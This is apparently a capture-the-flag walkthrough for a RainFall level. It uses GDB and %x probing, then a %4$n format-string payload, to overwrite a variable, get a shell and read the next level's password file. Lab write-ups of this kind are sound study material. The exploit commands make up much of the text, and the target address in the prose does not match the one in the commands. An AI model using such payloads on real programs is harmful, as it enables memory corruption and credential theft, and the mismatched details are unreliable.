# Walkthrough

**Main** : 
Exploiting a vulnerability in `printf` to change the value of a variable  `m` 
To tell `printf` to write the number of characters printed to a specified address, you can use the `%n` format specifier. However, to specify the address, you need to use the `%[number]$n` modifier. 
This modifier takes an argument specifying the position of the address on the stack. 
 The format string vulnerability allows  to modify the value at the specified address.

**Process**:  
> 1.  Found the address of the variable `m` using  debugging tools. 
> 2. Find  buffer  position on the stack.
>2.  Create the Payload, the payload will consist of multiple components:    
    -   Padding to reach the position on the stack where `%n` is expected.
    -   The format specifier `%[number]$n`, where `[number]` 
    -  Inject the Payload,  provide the payload as input to the program, which will then be used by `printf` to construct the output. 



##  The address of the variable `m` using GDB
```
level2@RainFall:~$ gdb ./level2 
...
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x804988c
(gdb) 

````


##  Position of a buffer on the stack
We ging to use printf to fnd the position of buffe on the stack
By using the %x format string vulnerability to print memory address on the stack I give printf the follow string `aaaaaa %x %x %x %x %x %x` the %x it telling to printf to print memory content <br/>
Buffer content `aaaaaa` is at the 4th position `61616161`.


```
level3@RainFall:~$ python -c 'print "aaaaaa" + " %x" * 6' | ./level3 
aaaaaa 200 b7fd1ac0 b7ff37d0 61616161 25206161 78252078

```



## Payload


The modifier %n will write the number of bytes specified in the choosen address.  
The command  `python -c 'print "\x8c\x95\x08\x08" + "\x90" * 60 + "%4$n"' > /tmp/payload`  
creates a format string attack that aims to modify a variable using the %n  
The  `%4$n`  specifier tells printf to treat the argument at the 4th position as an address to write the number of characters printed


**1. Create Payload**
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "\x90" * 60 + "%4$n"' > /tmp/payload
```

**2. load payload** 
```
level3@RainFall:~$ cat /tmp/payload - | ./level3 
�������������������������������������������������������������
Wait what?!

cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
